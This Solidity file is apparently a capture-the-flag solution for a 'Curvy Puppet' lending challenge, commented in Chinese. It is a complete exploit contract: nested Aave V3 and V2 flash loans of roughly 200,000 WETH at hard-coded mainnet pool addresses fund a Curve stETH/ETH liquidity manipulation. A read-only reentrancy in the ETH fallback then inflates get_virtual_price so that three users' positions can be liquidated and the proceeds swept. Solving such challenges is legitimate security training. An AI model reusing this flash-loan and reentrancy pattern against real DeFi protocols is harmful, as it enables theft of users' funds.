// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {WETH} from "solmate/tokens/WETH.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";

/// @dev Aave V2 WETH aToken; underlying balance = flash-loanable (minus tiny rounding)
/// @dev Aave V2 Pool `getReserveData(WETH).aTokenAddress`（与 Etherscan 上的 aWETH 一致）
address constant AAVE2_AWETH = 0x030bA81f1c18d280636F32af80b9AAd02Cf0854e;
/// @dev Aave V3 Pool `getReserveData(WETH).aTokenAddress`
address constant AAVE3_AWETH = 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8;

interface IAaveV2Pool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IAaveV3Pool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

/**
 * 利用 Curve stETH/ETH 池的只读重入。
 * 在 `remove_liquidity_imbalance` 已烧毁 LP、尚未转出 stETH 的 ETH 回调中，
 * `get_virtual_price` 会临时高估 LP 价格，使三人的仓位可被清算。
 */
contract CurvyPuppetAttacker {
    WETH public immutable weth;
    IStableSwap public immutable curve;
    CurvyPuppetLending public immutable lending;
    IERC20 public immutable lp;
    IERC20 public immutable stETH;
    address public immutable permit2;
    address public immutable dvt;
    address public immutable treasury;
    address[3] public users;

    IAaveV2Pool public constant V2 = IAaveV2Pool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IAaveV3Pool public constant V3 = IAaveV3Pool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);

    uint256 public v2WethCap;
    uint256 public v3WethCap;
    bool private _attacked;

    // 合约初始:           200 WETH (treasury) + 6.5 LP (treasury) + 600 WETH (deal)
    //     ─ V3 闪电贷 ─→  + 83,191 WETH
    //     ─ V2 闪电贷 ─→  + 116,076 WETH
    //     合计 WETH ≈ 199,867
    //
    // weth.withdraw(all)  → 199,867 ETH (原生)
    // curve.add_liquidity{value: 199867}  → 收 ~180,941 LP
    //                                     池子 ETH↑、stETH 不变、supply↑
    // curve.remove_liquidity_imbalance(   → 烧 ~169,915 LP (这一步触发 fallback 清算)
    //     [100, 35535.92], maxBurn)         返回的 token: 100 ETH + 35,535 stETH
    //                                     池子 ETH 略降、stETH 大降、supply 大降
    // curve.exchange(stETH→ETH, 35535)     → ~186,170 ETH (走二级市场换回)
    // remove_liquidity_one_coin(11k LP, 0) → ~12,422 ETH (零头 LP 也换成 ETH)
    // 合计原生 ETH ≈ 100 + 186,170 + 12,422 = 198,692
    // weth.deposit(198,692)                 → 重新得到 198,692 WETH
    // 最终 WETH ≈ 198,692 + 还没用过的 600 WETH 之类的余量
    // 够还 Aave V2 的 116,076 + premium，再回到 V3 还 83,191 + premium

    constructor(
        WETH _weth,
        IStableSwap _curve,
        CurvyPuppetLending _lending,
        IERC20 _lp,
        address _permit2,
        address _dvt,
        address _treasury,
        address[3] memory _users
    ) {
        weth = _weth;
        curve = _curve;
        lending = _lending;
        lp = _lp;
        stETH = IERC20(_curve.coins(1));
        permit2 = _permit2;
        dvt = _dvt;
        treasury = _treasury;
        users[0] = _users[0];
        users[1] = _users[1];
        users[2] = _users[2];

        v2WethCap = weth.balanceOf(AAVE2_AWETH);
        v3WethCap = weth.balanceOf(AAVE3_AWETH);

        _lp.approve(_permit2, type(uint256).max);
        IPermit2(_permit2).approve({
            token: address(_lp),
            spender: address(_lending),
            amount: uint160(3e18),
            expiration: type(uint48).max
        });
    }

    function attack() external {
        // 外层 V3 闪电贷，内层在 V2 回调中执行 Curve 操纵 + 在 ETH 回退中清算
        V3.flashLoanSimple(address(this), address(weth), v3WethCap, "", 0);
    }

    /// Aave V3 simple flash: 拉 Aave2 的额度，合起来 add_liquidity
    function executeOperation(address, uint256 amount, uint256 premium, address, bytes calldata) external returns (bool) {
        require(msg.sender == address(V3), "!v3");
        address[] memory assets = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        uint256[] memory modes = new uint256[](1);
        assets[0] = address(weth);
        amounts[0] = v2WethCap;
        modes[0] = 0;
        V2.flashLoan(address(this), assets, amounts, modes, address(0), "", 0);
        // 还 V3: 本金 + 手续费
        // weth.approve(msg.sender, type(uint256).max);
        weth.approve(msg.sender, amount + premium);
        return true;
    }

    /// Aave V2 flash: 把两笔 WETH unwrap 后喂给 Curve，然后 imbalance 移除触发虚拟价快照。
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == address(V2), "!v2");
        _executeCurveAttack();
        // 全额批准 Aave2 拉款；精确额度在极端舍入下可能不足
        // weth.approve(msg.sender, type(uint256).max);
        for (uint256 i = 0; i < assets.length; i++) {
            IERC20(assets[i]).approve(msg.sender, amounts[i] + premiums[i]);
        }
        return true;
    }

    function _executeCurveAttack() private {
        uint256 ethToUse = weth.balanceOf(address(this));
        weth.withdraw(ethToUse);  // unwrap weth to eth

        uint256 lpAdded = curve.add_liquidity{value: ethToUse}([ethToUse, 0], 0);  // add liquidity to curve
        // remove liquidity and receive 原生eth, stETH and LP零头, cause no receive, so call fallback
        curve.remove_liquidity_imbalance([uint256(1e20), uint256(3553592e16)], lpAdded);

        uint256 stETHBalance = stETH.balanceOf(address(this));
        stETH.approve(address(curve), stETHBalance);
        curve.exchange(1, 0, stETHBalance, 0); // stETH -> eth

        uint256 toBurn = lp.balanceOf(address(this));
        if (toBurn > 0) {
            curve.remove_liquidity_one_coin(toBurn, 0, 0); // lp token -> eth
        }

        weth.deposit{value: address(this).balance}(); // eth -> weth, 还款to aave v2 and v3
    }

    // 无 `receive`：空 calldata 的 native ETH 走 `fallback`（与题解一致）。Curve 在 remove 中转入 ETH
    // 时处于中间状态，get_virtual_price 读到的 LP 被高估，使清算条件满足（只读重入）。
    fallback() external payable {
        if (msg.sender == address(weth) || _attacked) {
            return;
        }
        for (uint256 i = 0; i < 3; i++) {
            lending.liquidate(users[i]);
        }
        IERC20(dvt).transfer(treasury, IERC20(dvt).balanceOf(address(this)));
        _attacked = true;
    }
}
